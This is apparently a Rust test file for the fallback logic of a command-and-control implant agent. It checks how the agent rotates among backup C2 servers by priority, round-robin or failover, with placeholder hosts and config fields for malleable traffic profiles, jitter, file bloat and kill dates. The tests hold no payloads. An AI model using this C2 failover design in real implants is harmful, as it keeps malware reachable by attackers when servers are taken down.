// tests/test_fallback.rs — Fallback strategy tests

use rcm::common::*;
use rcm::agent::fallback::FallbackManager;

fn make_config(endpoints: Vec<FallbackEndpoint>, strategy: FallbackStrategy) -> C2Config {
    C2Config {
        transport: TransportProtocol::Tls,
        profile: MalleableProfile::default(),
        proxy: ProxyConfig::default(),
        fallback: FallbackConfig {
            endpoints,
            strategy,
            dead_time_secs: 5,
        },
        server_public_key: String::new(),
        hash_salt: String::new(),
        c2_host: "default.com".into(),
        build_id: "test".into(),
        tunnel_port: 4443,
        sleep_interval: 5,
        jitter_min: 0,
        jitter_max: 0,
        bloat_mb: 0,
        debug: false,
        kill_date: None,
    }
}

fn ep(host: &str, port: u16, priority: u32) -> FallbackEndpoint {
    FallbackEndpoint {
        host: host.into(), port, transport: TransportProtocol::Tls,
        profile: None, proxy: None, priority, weight: 1, max_failures: 3,
    }
}

#[test]
fn test_no_fallback_uses_primary() {
    let config = make_config(vec![], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&config);

    let resolved = mgr.next_endpoint(&config).unwrap();
    assert_eq!(resolved.host, "default.com");
    assert_eq!(resolved.port, 4443);
}

#[test]
fn test_priority_strategy_picks_lowest() {
    let config = make_config(vec![
        ep("backup.com", 8443, 10),
        ep("primary.com", 443, 0),
        ep("emergency.com", 9443, 100),
    ], FallbackStrategy::Priority);

    let mut mgr = FallbackManager::from_config(&config);
    let r = mgr.next_endpoint(&config).unwrap();
    assert_eq!(r.host, "primary.com"); // priority 0 = first
}

#[test]
fn test_priority_falls_to_next_on_failure() {
    let config = make_config(vec![
        ep("primary.com", 443, 0),
        ep("backup.com", 8443, 10),
    ], FallbackStrategy::Priority);

    let mut mgr = FallbackManager::from_config(&config);

    // Fail primary 3 times (max_failures = 3)
    let r = mgr.next_endpoint(&config).unwrap();
    assert_eq!(r.host, "primary.com");
    mgr.record_failure(r.index);
    mgr.record_failure(r.index);
    mgr.record_failure(r.index); // Now dead

    let r2 = mgr.next_endpoint(&config).unwrap();
    assert_eq!(r2.host, "backup.com");
}

#[test]
fn test_round_robin_cycles() {
    let config = make_config(vec![
        ep("a.com", 443, 0),
        ep("b.com", 443, 0),
        ep("c.com", 443, 0),
    ], FallbackStrategy::RoundRobin);

    let mut mgr = FallbackManager::from_config(&config);

    let hosts: Vec<String> = (0..6).map(|_| {
        mgr.next_endpoint(&config).unwrap().host
    }).collect();

    assert_eq!(hosts[0], "a.com");
    assert_eq!(hosts[1], "b.com");
    assert_eq!(hosts[2], "c.com");
    assert_eq!(hosts[3], "a.com"); // wraps around
}

#[test]
fn test_round_robin_skips_dead() {
    let config = make_config(vec![
        ep("a.com", 443, 0),
        ep("b.com", 443, 0),
        ep("c.com", 443, 0),
    ], FallbackStrategy::RoundRobin);

    let mut mgr = FallbackManager::from_config(&config);

    // Kill b.com
    let _ = mgr.next_endpoint(&config); // a
    let r = mgr.next_endpoint(&config).unwrap(); // b
    assert_eq!(r.host, "b.com");
    mgr.record_failure(r.index);
    mgr.record_failure(r.index);
    mgr.record_failure(r.index);

    let r2 = mgr.next_endpoint(&config).unwrap(); // should be c, not b
    assert_eq!(r2.host, "c.com");
}

#[test]
fn test_failover_sticks_then_moves() {
    let config = make_config(vec![
        ep("primary.com", 443, 0),
        ep("backup.com", 443, 1),
    ], FallbackStrategy::Failover);

    let mut mgr = FallbackManager::from_config(&config);

    // Should stick to primary
    for _ in 0..5 {
        let r = mgr.next_endpoint(&config).unwrap();
        assert_eq!(r.host, "primary.com");
        mgr.record_success(r.index);
    }

    // Kill primary
    let r = mgr.next_endpoint(&config).unwrap();
    mgr.record_failure(r.index);
    mgr.record_failure(r.index);
    mgr.record_failure(r.index);

    // Should permanently move to backup
    let r = mgr.next_endpoint(&config).unwrap();
    assert_eq!(r.host, "backup.com");
}

#[test]
fn test_all_dead_resets() {
    let config = make_config(vec![
        ep("a.com", 443, 0),
        ep("b.com", 443, 0),
    ], FallbackStrategy::Priority);

    let mut mgr = FallbackManager::from_config(&config);

    // Kill both
    for idx in 0..2 {
        mgr.record_failure(idx);
        mgr.record_failure(idx);
        mgr.record_failure(idx);
    }

    // Should reset and return first
    let r = mgr.next_endpoint(&config).unwrap();
    assert_eq!(r.host, "a.com");
}

#[test]
fn test_record_success_clears_failures() {
    let config = make_config(vec![
        ep("host.com", 443, 0),
    ], FallbackStrategy::Priority);

    let mut mgr = FallbackManager::from_config(&config);

    // 2 failures (below max_failures=3)
    mgr.record_failure(0);
    mgr.record_failure(0);

    // Success should reset
    mgr.record_success(0);

    // 2 more failures shouldn't kill it (counter reset)
    mgr.record_failure(0);
    mgr.record_failure(0);

    let r = mgr.next_endpoint(&config).unwrap();
    assert_eq!(r.host, "host.com"); // Still alive
}

#[test]
fn test_per_endpoint_profile_override() {
    let custom_profile = MalleableProfile {
        name: "custom".into(),
        user_agent: "CustomAgent/1.0".into(),
        ..MalleableProfile::default()
    };

    let config = make_config(vec![
        FallbackEndpoint {
            host: "custom.com".into(), port: 443,
            transport: TransportProtocol::Https,
            profile: Some(custom_profile),
            proxy: None,
            priority: 0, weight: 1, max_failures: 3,
        },
    ], FallbackStrategy::Priority);

    let mut mgr = FallbackManager::from_config(&config);
    let r = mgr.next_endpoint(&config).unwrap();
    assert_eq!(r.profile.name, "custom");
    assert_eq!(r.profile.user_agent, "CustomAgent/1.0");
}

#[test]
fn test_status_summary() {
    let config = make_config(vec![
        ep("a.com", 443, 0),
        ep("b.com", 443, 1),
    ], FallbackStrategy::Priority);

    let mut mgr = FallbackManager::from_config(&config);
    mgr.record_success(0);
    mgr.record_failure(1);

    let summary = mgr.status_summary();
    assert!(summary.contains("a.com"));
    assert!(summary.contains("b.com"));
    assert!(summary.contains("OK"));
    assert!(summary.contains("DEGRADED"));
}
